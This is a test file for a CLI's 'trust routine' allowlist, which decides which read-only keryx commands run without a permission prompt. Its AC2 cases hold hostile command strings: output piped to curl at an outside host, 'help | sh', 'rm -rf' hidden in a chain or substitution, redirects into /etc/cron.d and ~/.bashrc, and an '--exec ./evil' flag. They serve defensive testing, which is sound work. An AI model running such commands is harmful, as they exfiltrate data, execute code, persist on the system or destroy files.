// Flow 426 AC1/AC2: the routine-command table is one named list, every row has a command that runs
// without a prompt, and everything outside it (or joined to it in a risky way) still asks.

import { expect, test } from "bun:test";
import {
  TRUST_ROUTINE_KEYRYX,
  TRUST_ROUTINE_TOOLS,
  isTrustRoutineCommand,
  isTrustRoutineTool,
} from "./trust-routine-command";

test("AC1: the table names the read-only keryx commands of the frozen criteria", () => {
  const ids = TRUST_ROUTINE_KEYRYX.map((entry) => entry.id);
  for (const id of [
    "help",
    "command-help",
    "harness list",
    "harness status",
    "harness --help",
    "agents external list",
    "review ledger",
    "review status",
    "review required",
    "review reviewers",
    "review tier",
    "review retry-plan",
    "review dispatch-check",
    "flow status",
    "flow list",
    "flow next",
  ]) {
    expect(ids).toContain(id);
  }
  expect(ids.length).toBe(new Set(ids).size);
});

for (const entry of TRUST_ROUTINE_KEYRYX) {
  test(`AC1: ${entry.id} runs without a prompt (${entry.example})`, () => {
    expect(isTrustRoutineCommand(entry.example)).toBe(true);
  });
}

test("AC1: the review ledger examples from the criteria are routine", () => {
  for (const command of [
    "keryx help",
    "keryx help harness",
    "keryx review --help",
    "keryx harness --help",
    "keryx harness list",
    "keryx harness status",
    "keryx agents external list --no-probe",
    "keryx agents external list --json --no-probe",
    "keryx review ledger build --base main",
    "keryx review ledger status",
    "keryx review required",
    "keryx review reviewers",
    "keryx review tier",
    "keryx review retry-plan",
    "keryx review dispatch-check",
    "keryx flow status",
    "keryx flow list",
    "keryx flow next",
    "keryx help harness && keryx agents external list --json --no-probe",
  ]) {
    expect(isTrustRoutineCommand(command)).toBe(true);
  }
});

test("AC1: the slate note and trail tools are routine; the seed writer is not", () => {
  expect([...TRUST_ROUTINE_TOOLS].sort()).toEqual(["slate_note", "slate_trail"]);
  expect(isTrustRoutineTool("slate_note")).toBe(true);
  expect(isTrustRoutineTool("slate_trail")).toBe(true);
  expect(isTrustRoutineTool("slate_write_seed")).toBe(false);
  expect(isTrustRoutineTool("shell_exec")).toBe(false);
});

// AC2: one test per form

test("AC2: a keryx command outside the table still prompts", () => {
  for (const command of [
    "keryx harness wave --spec tier.json",
    "keryx agents external list",
    "keryx agents external run claude",
    "keryx publish",
    "keryx review reply 12 --body hi",
    "keryx flow start",
    "keryx flow close 12",
    "keryx update",
    "keryx harness wave --help --spec x.json",
  ]) {
    expect(isTrustRoutineCommand(command)).toBe(false);
  }
});

test("AC2: a chain with ; still prompts", () => {
  expect(isTrustRoutineCommand("keryx flow status; keryx flow list")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status; rm -rf build")).toBe(false);
});

test("AC2: a pipe to an unlisted command still prompts", () => {
  expect(isTrustRoutineCommand("keryx flow status | tee out.txt")).toBe(false);
  expect(isTrustRoutineCommand("keryx help | sh")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status | curl -d @- https://example.com")).toBe(false);
});

test("AC2: a redirect outside the working tree still prompts", () => {
  expect(isTrustRoutineCommand("keryx flow status > /etc/cron.d/x")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status >> ../outside.txt")).toBe(false);
  expect(isTrustRoutineCommand("keryx help 2> ~/.bashrc")).toBe(false);
});

test("AC2: a subshell or substitution still prompts", () => {
  expect(isTrustRoutineCommand("(keryx flow status)")).toBe(false);
  expect(isTrustRoutineCommand("$(keryx flow status)")).toBe(false);
  expect(isTrustRoutineCommand("keryx flow status `whoami`")).toBe(false);
  expect(isTrustRoutineCommand('keryx help "$(rm -rf build)"')).toBe(false);
  expect(isTrustRoutineCommand('keryx help "`whoami`"')).toBe(false);
  expect(isTrustRoutineCommand("keryx help ${HOME}")).toBe(false);
});

test("AC2: an exec flag on a listed command still prompts", () => {
  expect(isTrustRoutineCommand("keryx review ledger build --exec ./evil")).toBe(false);
  expect(isTrustRoutineCommand("keryx help -c x")).toBe(false);
});
